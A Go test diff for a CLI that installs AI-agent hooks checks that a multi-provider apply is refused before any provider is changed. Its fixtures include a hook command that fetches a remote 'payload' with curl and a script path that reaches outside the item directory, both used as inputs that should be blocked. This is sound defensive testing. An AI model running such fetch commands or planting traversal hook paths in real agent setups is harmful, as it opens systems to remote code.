@@ -1358,37 +1358,47 @@ func TestRunLoadoutApply_HighFindingHookNeedsForce(t *testing.T) {
 	}
 }
 
-// A flagged hook for the second provider refuses the apply before the first
-// provider changes, so the retry with --force starts from a clean state.
+// A hook the second provider would refuse stops the apply before the first
+// provider changes, so the retry starts from a clean state.
 func TestRunLoadoutApply_MultiProviderRefusalChangesNoProvider(t *testing.T) {
-	root := setupLoadoutApplyRepo(t, "", "", nil)
-	home := t.TempDir()
-	t.Setenv("HOME", home)
-	origDir := config.GlobalDirOverride
-	config.GlobalDirOverride = t.TempDir()
-	t.Cleanup(func() { config.GlobalDirOverride = origDir })
-	loDir := filepath.Join(root, "loadouts", "claude-code", "both")
-	os.MkdirAll(loDir, 0755)
-	os.WriteFile(filepath.Join(loDir, "loadout.yaml"), []byte("kind: loadout\nversion: 1\nname: both\ndescription: test loadout\nproviders:\n  - claude-code\n  - gemini-cli\nhooks:\n  - fetcher\n"), 0644)
-	for slug, command := range map[string]string{
-		"claude-code": "echo done",
-		"gemini-cli":  "curl https://example.com/payload",
+	for _, tc := range []struct {
+		name, command, want string
+	}{
+		{"scanner finding", "curl https://example.com/payload", "--force"},
+		{"script outside the item", "../outside.sh", "outside item directory"},
 	} {
-		hookDir := filepath.Join(root, "hooks", slug, "fetcher")
-		os.MkdirAll(hookDir, 0755)
-		os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"after_tool_execute","handler":{"type":"command","command":"`+command+`"}}]}`), 0644)
-	}
-	output.SetForTest(t)
-	loadoutApplyCmd.Flags().Set("keep", "true")
-	defer resetLoadoutApplyFlags()
+		t.Run(tc.name, func(t *testing.T) {
+			root := setupLoadoutApplyRepo(t, "", "", nil)
+			home := t.TempDir()
+			t.Setenv("HOME", home)
+			origDir := config.GlobalDirOverride
+			config.GlobalDirOverride = t.TempDir()
+			t.Cleanup(func() { config.GlobalDirOverride = origDir })
+			loDir := filepath.Join(root, "loadouts", "claude-code", "both")
+			os.MkdirAll(loDir, 0755)
+			os.WriteFile(filepath.Join(loDir, "loadout.yaml"), []byte("kind: loadout\nversion: 1\nname: both\ndescription: test loadout\nproviders:\n  - claude-code\n  - gemini-cli\nhooks:\n  - fetcher\n"), 0644)
+			os.WriteFile(filepath.Join(root, "hooks", "outside.sh"), []byte("#!/bin/sh\n"), 0755)
+			for slug, command := range map[string]string{
+				"claude-code": "echo done",
+				"gemini-cli":  tc.command,
+			} {
+				hookDir := filepath.Join(root, "hooks", slug, "fetcher")
+				os.MkdirAll(hookDir, 0755)
+				os.WriteFile(filepath.Join(hookDir, "hook.json"), []byte(`{"spec":"hooks/0.1","hooks":[{"event":"after_tool_execute","handler":{"type":"command","command":"`+command+`"}}]}`), 0644)
+			}
+			output.SetForTest(t)
+			loadoutApplyCmd.Flags().Set("keep", "true")
+			defer resetLoadoutApplyFlags()
 
-	err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"both"})
-	var se output.StructuredError
-	if !errors.As(err, &se) || !strings.Contains(se.Message, "gemini-cli") || !strings.Contains(se.Suggestion, "--force") {
-		t.Fatalf("keep: got %v, want a gemini-cli error suggesting --force", err)
-	}
-	if _, err := os.Stat(filepath.Join(home, ".claude", "settings.json")); !os.IsNotExist(err) {
-		t.Errorf("refused apply changed claude-code first (stat err %v)", err)
+			err := loadoutApplyCmd.RunE(loadoutApplyCmd, []string{"both"})
+			var se output.StructuredError
+			if !errors.As(err, &se) || !strings.Contains(se.Message, "gemini-cli") || !strings.Contains(se.Suggestion+se.Details, tc.want) {
+				t.Fatalf("keep: got %v, want a gemini-cli error mentioning %q", err, tc.want)
+			}
+			if _, err := os.Stat(filepath.Join(home, ".claude", "settings.json")); !os.IsNotExist(err) {
+				t.Errorf("refused apply changed claude-code first (stat err %v)", err)
+			}
+		})
 	}
 }
 
